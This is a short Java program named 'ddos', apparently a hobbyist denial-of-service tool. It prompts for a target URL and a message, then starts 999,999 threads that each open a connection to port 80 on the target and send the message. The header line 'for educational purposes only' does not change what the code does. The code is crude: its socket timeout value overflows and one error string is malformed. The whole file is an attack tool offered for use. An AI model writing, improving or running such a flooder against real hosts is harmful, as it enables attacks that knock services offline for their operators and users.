import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.*;

class Attackers extends Thread {
	private String target;
	private String message;
	
	public Attackers(String target, String message) {
		this.target = target;
		this.message = message;
	}
	public void run() {
        try {
            attack(target, message);
            Thread.sleep(1000);
        } catch(InterruptedException ex) {
            ex.printStackTrace();
        }
		
	}
	public void attack(String target, String message) {
		try {
			InetAddress host = InetAddress.getByName(target);
			System.out.println(host.getHostAddress());
			
			Socket socket = new Socket(host, 80);
            socket.setSoTimeout(100000*100000);
            OutputStream out = socket.getOutputStream();
			OutputStreamWriter writer = new OutputStreamWriter(out);
			BufferedWriter bw = new BufferedWriter(writer);
			
			bw.write(message);
			bw.flush();
            System.out.println("Sent");
            socket.close();
		} catch (Exception e) {
			System.out.println("Connection timeout );");
		}
	}
}
public class ddos {
	public static void main(String[] args) {
		
		Scanner sc = new Scanner(System.in);
		String target, message;
		System.out.println("DDOS ATTACK");
		System.out.println("PROGRAM BY DE_CODER_079");
		System.out.println("for educational purposes only");
		
		System.out.println("Enter the target URL: ");	
		target = sc.nextLine();
		System.out.println("Enter the message: ");
		message = sc.nextLine();
		// getting the host name and address
		
		for(int i=0;i<999999;i++) {
			Attackers var = new Attackers(target, message);
			var.start();
		}
		
		sc.close();
			
	}

}
